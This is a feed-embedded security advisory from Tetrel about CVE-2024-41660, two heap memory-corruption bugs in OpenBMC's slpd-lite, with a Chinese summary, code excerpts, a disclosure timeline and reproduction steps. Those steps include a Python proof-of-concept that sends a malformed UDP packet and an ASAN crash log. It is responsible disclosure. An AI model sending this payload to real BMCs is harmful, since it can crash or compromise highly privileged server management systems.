+<p>However, it is unfortunately common for integrators to expose their BMC network services to the internet, hence an argument for an elevated severity for this finding:</p>
+<ul>
+<li><a href="https://threatpost.com/ipmi-protocol-bmc-vulnerabilities-expose-thousands-of-servers-to-attack/101202/" target="_blank">Threatpost: <em>IPMI Protocol, BMC Vulnerabilities Expose Thousands of Servers to Attack</em></a></li>
+<li><a href="https://eclypsium.com/research/virtual-media-vulnerability-in-bmc-opens-servers-to-remote-attack/" target="_blank">Eclypsium: <em>Virtual Media Vulnerability in BMC Opens Servers to Remote Attack</em></a></li>
+<li><a href="https://isc.sans.edu/diary/28276" target="_blank">SANS Technology Institute: <em>Over 20 thousand servers have their iLO interfaces exposed to the internet…</em></a></li>
+</ul>
+<h2>Disclosure Timeline
+<span>
+<a href="#disclosure-timeline" aria-label="Anchor">#</a>
+</span>
+</h2>
+<ul>
+<li><strong>May 22, 2024</strong> - Tetrel reports issues to the OpenBMC’s security mailing list in the <a href="https://github.com/openbmc/docs/security" target="_blank">OpenBMC Security Policy</a></li>
+<li><strong>May 28, 2024</strong> - <em>slpd-lite</em> developers patch issues</li>
+<li><strong>July 29, 2024</strong> - OpenBMC <a href="https://github.com/openbmc/slpd-lite/security/advisories/GHSA-wmgv-jffg-v3xr" target="_blank">publishes advisory</a> and <a href="https://github.com/openbmc/openbmc/commit/350cb5f326d52aa7bb6c423e07fdaf26292f3541" target="_blank">applies patch</a> to the OpenBMC project</li>
+<li><strong>August 16, 2024</strong> - Tetrel publishes vulnerability details (this post)</li>
+</ul>
+<p>Thanks to <a href="https://github.com/geissonator" target="_blank">Andrew Geissler</a> and the OpenBMC Security Response Team for the rapid fix and advisory release!</p>
+<p><sup>ASPEED BMC Photo by <a href="https://commons.wikimedia.org/wiki/User:Phiarc" target="_blank">Phiarc</a>. CC BY-SA 4.0.</sup></p>
+</div>
+</div>
+</section>
+<footer>
+</footer>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[Shawn the R0ck 写道：“
+Tetrel Security 公开了一个 SLPD-Lite 漏洞（CVE-2024-41660）的细节，slpd-lite 是 OpenBMC 的组件之一，此漏洞因为由 OpenBMC（部分OEM厂商实现）网络安全产生了严重的影响，因为它允许攻击者在易受攻击的系统上远程执行任意代码。
+<br>
+OpenBMC 是一个为服务器开发标准基板管理控制器（BMC）的标准实现框架。BMC允许对服务器硬件进行远程管理，广泛部署在服务器硬件中，提供监控、日志记录功能以及带外恢复和维护工具。由于BMC通常具有高度特权，因此将BMC网络接口隔离到一个独立的管理网络是安全最佳实践。
+<br>
+Tetrel在审查OpenBMC源代码时发现了slpd-lite子组件中的两个内存损坏漏洞。在典型部署中，成功利用这些漏洞将允许具有对BMC管理网络访问权限的攻击者完全攻陷BMC。
+<br>
+第一个漏洞涉及堆中分配的数据的越界读取，可能泄露信息给攻击者。第二个漏洞允许攻击者在堆中分配的数据结构范围之外进行写入。结合这两个漏洞，可以直接实现远程漏洞利用。Tetrel公开了漏洞成因，和相关技术细节，包括代码片段和漏洞的潜在利用方式。同时，还提供了有关如何确认堆损坏可能性的重现步骤，以及在Ubuntu 22.04.04 LTS上测试漏洞的过程。
+<br>
+如果你的数据中心使用了集成spld-lite的OEM厂商提供的BMC（无论是否基于OpenBMC)，务必尽快升级。HardenedVault的OpenBMC实现由于spld-lite并没有集成，所以不受影响。”
+<br>
+https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/<br /><hr />
+<p><a href="https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/" target="_blank">https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/</a></p>
+<header>
+<h1>
+CVE-2024-41660: A Critical Vulnerability in OpenBMC
+</h1>
+<div>
+<div>
+<time datetime="2024-08-16 00:00:00 +0000 UTC">16 August 2024</time>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/jon.szymaniak">
+Jon Szymaniak
+</a>
+<div>Principal Consultant</div>
+<div>
+</div>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/jameson.hyde">
+Jameson Hyde
+</a>
+<div>Principal Consultant</div>
+<div>
+</div>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/eric.evenchick">
+Eric Evenchick
+</a>
+<div>Managing Partner</div>
+<div>
+</div>
+</div>
+</div>
+</header>
+<section>
+<div>
+<div>
+<details open="">
+<summary>
+Table of Contents
+</summary>
+<div>
+<nav>
+<ul>
+<li><a href="#technical-overview">Technical Overview</a></li>
+<li><a href="#technical-details">Technical Details</a>
+<ul>
+<li></li>
+<li><a href="#reproduction-steps">Reproduction Steps</a></li>
+<li><a href="#technical-impact">Technical Impact</a></li>
+<li><a href="#exploitation-conditions">Exploitation Conditions</a></li>
+</ul>
+</li>
+<li><a href="#disclosure-timeline">Disclosure Timeline</a></li>
+</ul>
+</nav>
+</div>
+</details>
+<details>
+<summary>
+Table of Contents
+</summary>
+<div>
+<nav>
+<ul>
+<li><a href="#technical-overview">Technical Overview</a></li>
+<li><a href="#technical-details">Technical Details</a>
+<ul>
+<li></li>
+<li><a href="#reproduction-steps">Reproduction Steps</a></li>
+<li><a href="#technical-impact">Technical Impact</a></li>
+<li><a href="#exploitation-conditions">Exploitation Conditions</a></li>
+</ul>
+</li>
+<li><a href="#disclosure-timeline">Disclosure Timeline</a></li>
+</ul>
+</nav>
+</div>
+</details>
+</div>
+</div>
+<div>
+<div>
+<p>The <a href="https://www.openbmc.org/" target="_blank">OpenBMC Project</a> is a community effort to develop a standard Baseboard Management Controller (BMC) for servers. BMCs allow for remote management of server hardware. They are widely deployed in server hardware to provide monitoring and logging features and tools for out-of-band recovery and maintenance. To allow for management of the server hardware, BMCs are typically highly privileged. As such, it is a security best practice to isolate BMC network interfaces to an isolated management network.</p>
+<p>During review of the <a href="https://github.com/openbmc" target="_blank">OpenBMC source code</a>, Tetrel discovered a critical vulnerability in the <a href="https://github.com/openbmc/slpd-lite" target="_blank">slpd-lite</a> sub-component. A <a href="https://github.com/openbmc/slpd-lite/security/advisories/GHSA-wmgv-jffg-v3xr" target="_blank">security advisory</a> has been issued for this vulnerability, and a CVSSv3.1 score of 9.8 / Critical has been assigned. The vulnerability has been assigned CVE ID <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41660" target="_blank">CVE-2024-41660</a>.</p>
+<p>The default OpenBMC build configuration <a href="https://github.com/openbmc/openbmc/blob/b882b26a17008d35e951b23126ee9f3229170944/meta-phosphor/conf/distro/include/phosphor-base.inc#L106" target="_blank">installs</a> and <a href="https://github.com/openbmc/openbmc/blob/b882b26a17008d35e951b23126ee9f3229170944/meta-phosphor/classes/obmc-phosphor-discovery-service.bbclass#L8" target="_blank">enables</a> the <em>slpd-lite</em> service. OpenBMC builds that do not explicitly disable the service will be vulnerable if the service is not updated to the patched version.</p>
+<h2>Technical Overview
+<span>
+<a href="#technical-overview" aria-label="Anchor">#</a>
+</span>
+</h2>
+<p>Within the <em>slpd-lite</em> network service running on the BMC, Tetrel identified two memory corruption vulnerabilities in the message handling code. In a typical deployment, successful exploitation of these vulnerabilities would allow an attacker with access to the BMC management network to fully compromise a BMC.</p>
+<h2>Technical Details
+<span>
+<a href="#technical-details" aria-label="Anchor">#</a>
+</span>
+</h2>
+<p>This finding pertains to the <a href="https://github.com/openbmc/slpd-lite" target="_blank">OpenBMC implementation of slpd-lite</a>. It was observed on the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/" target="_blank">most recent commit</a> at the time of writing.</p>
+<p>As shown in the abbreviated BMC console output below, a UDP-based <em>slpd</em> service runs as root and listens on port 427 (<em>svrloc</em>):</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>root@qemu:~# netstat -lup
+</span></span><span><span>Active Internet connections <span>(</span>only servers<span>)</span>
+</span></span><span><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span><span>udp6       <span>0</span>      <span>0</span> <span>[</span>::<span>]</span>:svrloc             <span>[</span>::<span>]</span>:*                              1280/slpd
+</span></span><span><span>
+</span></span><span><span>root@qemu:~# ps <span>|</span> grep slpd
+</span></span><span><span> <span>1280</span> root      <span>5516</span> S    /usr/sbin/slpd
+</span></span></code></pre></div>
+<h4>Vulnerability 1: Lack of Language Tag Length Validation Leads to OOB Heap Read
+<span>
+<a href="#vulnerability-1-lack-of-language-tag-length-validation-leads-to-oob-heap-read" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The first vulnerability is an out-of-bounds (OOB) read of heap-allocated data. This class of vulnerability has the potential to disclose information to an attacker, such as in-memory secrets or the addresses of code needed to exploit a separate OOB write.</p>
+<p>The following code excerpt illustrates how <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/sock_channel.cpp#L22" target="_blank"><code>udpsocket::Channel::read()</code></a> reads data into and resizes a <code>buffer</code> object (<a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L19" target="_blank">a <code>std::vector&lt;uint8_t&gt;</code></a>).</p>
+<p>Note that this buffer size is determined by how many bytes were received in the UDP datagram.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>std</span><span>::</span><span>tuple</span><span>&lt;</span><span>int</span><span>,</span> <span>buffer</span><span>&gt;</span> <span>Channel</span><span>::</span><span>read</span><span>()</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>int</span> <span>rc</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>int</span> <span>readSize</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>ssize_t</span> <span>readDataLen</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>buffer</span> <span>outBuffer</span><span>(</span><span>0</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>outBuffer</span><span>.</span><span>resize</span><span>(</span><span>readSize</span><span>);</span>
+</span></span><span><span>    <span>auto</span> <span>bufferSize</span> <span>=</span> <span>outBuffer</span><span>.</span><span>size</span><span>();</span>
+</span></span><span><span>    <span>auto</span> <span>outputPtr</span> <span>=</span> <span>outBuffer</span><span>.</span><span>data</span><span>();</span>
+</span></span><span><span>
+</span></span><span><span>    <span>address</span><span>.</span><span>addrSize</span> <span>=</span> <span>static_cast</span><span>&lt;</span><span>socklen_t</span><span>&gt;</span><span>(</span><span>sizeof</span><span>(</span><span>address</span><span>.</span><span>inAddr</span><span>));</span>
+</span></span><span><span>
+</span></span><span><span>    <span>do</span>
+</span></span><span><span>    <span>{</span>
+</span></span><span><span>        <span>readDataLen</span> <span>=</span> <span>recvfrom</span><span>(</span><span>sockfd</span><span>,</span>             <span>// File Descriptor
+</span></span></span><span><span>                               <span>outputPtr</span><span>,</span>          <span>// Buffer
+</span></span></span><span><span>                               <span>bufferSize</span><span>,</span>         <span>// Bytes requested
+</span></span></span><span><span>                               <span>0</span><span>,</span>                  <span>// Flags
+</span></span></span><span><span>                               <span>&amp;</span><span>address</span><span>.</span><span>sockAddr</span><span>,</span>  <span>// Address
+</span></span></span><span><span>                               <span>&amp;</span><span>address</span><span>.</span><span>addrSize</span><span>);</span> <span>// Address Length
+</span></span></span><span><span>
+</span></span><span><span>        <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>}</span> <span>while</span> <span>((</span><span>readDataLen</span> <span>&lt;</span> <span>0</span><span>)</span> <span>&amp;&amp;</span> <span>(</span><span>-</span><span>(</span><span>rc</span><span>)</span> <span>==</span> <span>EINTR</span><span>));</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// Resize the vector to the actual data read from the socket
+</span></span></span><span><span>    <span>outBuffer</span><span>.</span><span>resize</span><span>(</span><span>readDataLen</span><span>);</span>
+</span></span><span><span>    <span>return</span> <span>std</span><span>::</span><span>make_tuple</span><span>(</span><span>rc</span><span>,</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>outBuffer</span><span>));</span>
+</span></span><span><span><span>}</span>
+</span></span></code></pre></div><p>The excerpt below contains part of the <code>parseHeader()</code> method, which creates and returns a <code>Message</code> object from the raw data <code>buffer</code> obtained by <code>udpsocket::Channel::read()</code> above. Observe that the 16-bit <code>langtagLen</code> variable assigned by extracting the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp_parser.cpp#L30" target="_blank">Language Tag Length field</a> and then converting it to the host byte-order.</p>
+<p>Next, the code attempts to copy the Language Tag string from the raw data <code>buffer</code> into the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L106" target="_blank"><code>req.header.langtag</code> string</a> (i.e. a string in the request <code>Message</code>’s <code>Header</code>).</p>
+<p>However, observe that in doing so, it fails to first confirm that the amount of remaining data in the raw <code>buffer</code> is actually <code>langtagLen</code> bytes.  Since this field is attacker controlled, it could be any value – including one that is much larger than the actual datagram size.</p>
+<p>The consequence of this missing check is that the <code>req.header.langtag</code> can be populated with not only the desired Language Tag string, but also arbitrary data that resides after <code>buff.data()</code>.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>std</span><span>::</span><span>tuple</span><span>&lt;</span><span>int</span><span>,</span> <span>Message</span><span>&gt;</span> <span>parseHeader</span><span>(</span><span>const</span> <span>buffer</span><span>&amp;</span> <span>buff</span><span>)</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>Message</span> <span>req</span><span>{};</span>
+</span></span><span><span>    <span>int</span> <span>rc</span> <span>=</span> <span>slp</span><span>::</span><span>SUCCESS</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>uint16_t</span> <span>langtagLen</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>std</span><span>::</span><span>copy_n</span><span>(</span><span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG_LEN</span><span>,</span>
+</span></span><span><span>                <span>slp</span><span>::</span><span>header</span><span>::</span><span>SIZE_LANG</span><span>,</span> <span>(</span><span>uint8_t</span><span>*</span><span>)</span><span>&amp;</span><span>langtagLen</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>langtagLen</span> <span>=</span> <span>endian</span><span>::</span><span>from_network</span><span>(</span><span>langtagLen</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: Heap buffer overflow occurs here
+</span></span></span><span><span>    <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>insert</span><span>(</span>
+</span></span><span><span>        <span>0</span><span>,</span> <span>(</span><span>const</span> <span>char</span><span>*</span><span>)</span><span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG</span><span>,</span> <span>langtagLen</span><span>);</span>
+</span></span></code></pre></div><p>The call path to the affected code is as follows:</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>requestHandler</span> <span>// main.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>udpsocket</span><span>::</span><span>Channel</span><span>::</span><span>read</span> <span>// sock_channel.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>parser</span><span>::</span><span>parseBuffer</span> <span>// slp_parser.cpp
+</span></span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>internal</span><span>::</span><span>parseHeader</span>
+</span></span></code></pre></div>
+<h4>Vulnerability 2: Unsigned Integer Wrap of (Unevaluated) Length Field Yields OOB Heap Write
+<span>
+<a href="#vulnerability-2-unsigned-integer-wrap-of-unevaluated-length-field-yields-oob-heap-write" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The second vulnerability allows an attacker to write outside the bounds of a heap-allocated data structure. Combined with the first vulnerability, this has potential to be exploited in practice.</p>
+<p>The code shown below is executed when the <em>slpd</em> server is preparing a response to either of the two request types supported by <em>slpd-lite</em>.</p>
+<p>First, make note of the computation of the <code>uint8_t length</code> variable. Here, an <a href="https://wiki.sei.cmu.edu/confluence/display/c/INT30-C.+Ensure+that+unsigned+integer+operations+do+not+wrap" target="_blank">unsigned integer wrap</a> can occur because <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L106" target="_blank"><code>req.header.langtag</code> is actually a <code>std::string</code></a>. The return value of <code>std::string::length()</code> is a <code>size_t</code>. The actual length of this string is determined by a <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp_parser.cpp#L56-L64" target="_blank"><code>uint16_t</code> length field in the original request</a> during a preceding call to <code>slp::parser::parseBuffer</code>.</p>
+<p>Thus, a 16-bit unsigned value (in a <code>size_t</code>) is added two other values, and then truncated to an unsigned 8-bit value. For many possible length values, the resulting 8-bit value is smaller than that returned by <code>req.header.langtag.length()</code>.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>buffer</span> <span>prepareHeader</span><span>(</span><span>const</span> <span>Message</span><span>&amp;</span> <span>req</span><span>)</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>uint8_t</span> <span>length</span> <span>=</span>
+</span></span><span><span>        <span>slp</span><span>::</span><span>header</span><span>::</span><span>MIN_LEN</span> <span>+</span>        <span>/* 14 bytes for header     */</span>
+</span></span><span><span>        <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>length</span><span>()</span> <span>+</span> <span>/* Actual length of lang tag */</span>
+</span></span><span><span>        <span>slp</span><span>::</span><span>response</span><span>::</span><span>SIZE_ERROR</span><span>;</span>    <span>/*  2 bytes for error code */</span>
+</span></span><span><span>
+</span></span><span><span>    <span>buffer</span> <span>buff</span><span>(</span><span>length</span><span>,</span> <span>0</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>buff</span><span>[</span><span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_VERSION</span><span>]</span> <span>=</span> <span>req</span><span>.</span><span>header</span><span>.</span><span>version</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>// tetrel: OOB heap buffer write occurs here
+</span></span></span><span><span>    <span>std</span><span>::</span><span>copy_n</span><span>((</span><span>uint8_t</span><span>*</span><span>)</span><span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>c_str</span><span>(),</span>
+</span></span><span><span>                <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>length</span><span>(),</span>
+</span></span><span><span>                <span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG</span><span>);</span>
+</span></span><span><span>    <span>return</span> <span>buff</span><span>;</span>
+</span></span><span><span><span>}</span>
+</span></span></code></pre></div><p>Next, observe that a zero-filled <code>buffer</code> is allocated with a size argument specified via the 8-bit <code>length</code> value.</p>
+<p>At the end of <code>prepareHeader()</code>, the code attempts to copy the Language Tag from the request header into the response header. However, it does so with <strong>the actual <code>size_t</code> string length</strong>, which can be up to 65535 bytes. The inherent UDP datagram length limits this maximum value to be somewhat smaller. However, it still can be much larger than 255 bytes which will result in an overflow.</p>
+<p>As a result, the <code>std::copy_n()</code> write overflows the heap-allocated buffer and corrupts nearby memory. Exploiting heap corruption is <a href="https://github.com/shellphish/how2heap" target="_blank">well-studied</a> and has potential for an attacker to achieve arbitrary code execution.</p>
+<p>The call path to this affected code is as follows:</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>requestHandler</span> <span>// main.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>parser</span><span>::</span><span>parseBuffer</span> <span>// slp_parser.cpp - Convert raw data buffer to a Message object
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>processRequest</span> <span>// slp_message_handler.cpp - Process Message, top-level
+</span></span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>processSrvTypeRequest</span> <span>// Process Service Type Request
+</span></span></span><span><span>        <span>OR</span>
+</span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>processSrvRequest</span> <span>-</span> <span>Process</span> <span>Service</span> <span>Request</span>
+</span></span><span><span>            <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>prepareHeader</span> <span>-</span> <span>Prepare</span> <span>response</span> <span>buffer</span>
+</span></span></code></pre></div>
+<h3>Reproduction Steps
+<span>
+<a href="#reproduction-steps" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>Below is the process used by Tetrel to confirm that heap corruption is possible. This procedure has been tested on Ubuntu 22.04.04 LTS.</p>
+<h4>1. Install dependencies, if necessary
+<span>
+<a href="#1-install-dependencies-if-necessary" aria-label="Anchor">#</a>
+</span>
+</h4>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt install build-essential libsystemd-dev meson clang-15 lld-15
+</span></span></code></pre></div>
+<h4>2. Download and Compile slpd-lite with Address Sanitizer (ASAN)
+<span>
+<a href="#2-download-and-compile-slpd-lite-with-address-sanitizer-asan" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The following commands demonstrate how to check out the version of slpd-lite specified in the <code>slpd-lite_git.bb</code> Yocto recipe.</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>git clone https://github.com/openbmc/slpd-lite
+</span></span><span><span><span>cd</span> slpd-lite
+</span></span><span><span>git checkout 55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4
+</span></span></code></pre></div><p>In order to quickly perform a test without needing to run the vulnerable code as root, edit line 9 of <code>slp_meta.hpp</code> to change the listening port number from 427 to 4427:</p>
+<div><pre tabindex="0"><code data-lang="CPP"><span><span><span>constexpr</span> <span>auto</span> <span>PORT</span> <span>=</span> <span>4427</span><span>;</span>
+</span></span></code></pre></div><p>Next, setup up the build environment, compile, and run the <code>slpd</code> binary:</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span><span>CC</span><span>=</span>clang-15 <span>CXX</span><span>=</span>clang++-15 <span>CC_LD</span><span>=</span>lld-15 <span>CXX_LD</span><span>=</span>lld-15 <span>LDFLAGS</span><span>=</span>-lasan <span>\
+</span></span></span><span><span>    meson setup build -Db_sanitize<span>=</span>address -Db_lundef<span>=</span><span>false</span>
+</span></span><span><span><span>cd</span> build
+</span></span><span><span>meson compile
+</span></span><span><span>./slpd
+</span></span></code></pre></div>
+<h4>3. Create and Run Proof-of-Concept Client
+<span>
+<a href="#3-create-and-run-proof-of-concept-client" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>Copy the following Python script to a <code>poc.py</code> file and run it. Note that this is written to connect to the server on port 4427, rather than the default 427.</p>
+<div><pre tabindex="0"><code data-lang="py"><span><span><span>#!/usr/bin/env python3</span>
+</span></span><span><span><span>from</span> <span>socket</span> <span>import</span> <span>*</span>
+</span></span><span><span>
+</span></span><span><span><span>sock</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_DGRAM</span><span>)</span>
+</span></span><span><span><span>addr</span> <span>=</span> <span>(</span><span>"127.0.0.1"</span><span>,</span> <span>4427</span><span>)</span>
+</span></span><span><span><span>payload</span> <span>=</span> <span>(</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x02</span><span>'</span> <span>+</span>      <span># Version</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x09</span><span>'</span> <span>+</span>      <span># Function ID: SRVTYPERQST</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Ignored Length bytes?</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\xff</span><span>'</span> <span>+</span>      <span># Length</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Flags</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>3</span> <span>+</span>  <span># Ext</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># XID</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\xff</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Language Tag Length</span>
+</span></span><span><span>        <span>b</span><span>'A'</span> <span>*</span> <span>65000</span>   <span># Language Tag</span>
+</span></span><span><span><span>)</span>
+</span></span><span><span><span>sock</span><span>.</span><span>sendto</span><span>(</span><span>payload</span><span>,</span> <span>addr</span><span>)</span>
+</span></span></code></pre></div>
+<h4>4. Observe Heap Corruption in the ASAN Report
+<span>
+<a href="#4-observe-heap-corruption-in-the-asan-report" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>Observed that the <code>slpd</code> process crashes and an ASAN report is generated. An example is provided below, which demonstrates that the first vulnerability documented in this finding has been triggered.</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span><span>==</span><span>17145</span><span>==</span>ERROR: AddressSanitizer: heap-buffer-overflow on address 0x63000000fe0e at pc 0x5c87b6c78f47 ...
+</span></span><span><span>READ of size <span>65535</span> at 0x63000000fe0e thread T0
+</span></span><span><span>    <span>#0 0x5c87b6c78f46 in __asan_memcpy (build/slpd+0xe5f46) </span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#6 0x642f6e4d79a0 in std::__cxx11::basic_string&lt;...&gt;::insert(...) .../bits/basic_string.h:1707:22</span>
+</span></span><span><span>    <span>#7 0x5c87b6ccdc5b in slp::parser::internal::parseHeader(...) slp_parser.cpp:63:24</span>
+</span></span><span><span>    <span>#8 0x5c87b6ccf40c in slp::parser::parseBuffer(...) slp_parser.cpp:240:25</span>
+</span></span><span><span>    <span>#9 0x5c87b6cb6ca1 in requestHandler(sd_event_source*, int, unsigned int, void*) main.cpp:33:33</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>
+</span></span><span><span>0x63000000fe0e is located <span>0</span> bytes to the right of 64014-byte region <span>[</span>0x630000000400,0x63000000fe0e<span>)</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#0 0x5c87b6cb3e9d in operator new(unsigned long) (slpd+0x120e9d)</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#6 0x5c87b6cbf5b5 in std::vector&lt;...&gt;::resize(unsigned long) include/c++/11/bits/stl_vector.h:940:4</span>
+</span></span><span><span>    <span>#7 0x5c87b6cd25fd in udpsocket::Channel::read() sock_channel.cpp:36:15</span>
+</span></span><span><span>    <span>#8 0x5c87b6cb69f9 in requestHandler(sd_event_source*, int, unsigned int, void*) main.cpp:20:38</span>
+</span></span><span><span>    <span>#9 0x72f3ba3a5668  (/lib/x86_64-linux-gnu/libsystemd.so.0+0x73668) </span>
+</span></span><span><span>
+</span></span><span><span>SUMMARY: AddressSanitizer: heap-buffer-overflow <span>(</span>slpd+0xe5f46<span>)</span> in __asan_memcpy
+</span></span><span><span>Shadow bytes around the buggy address:
+</span></span><span><span>  0x0c607fff9f70: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9f80: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9f90: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9fa0: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9fb0: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span><span>=</span>&gt;0x0c607fff9fc0: 00<span>[</span>06<span>]</span>fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9fd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
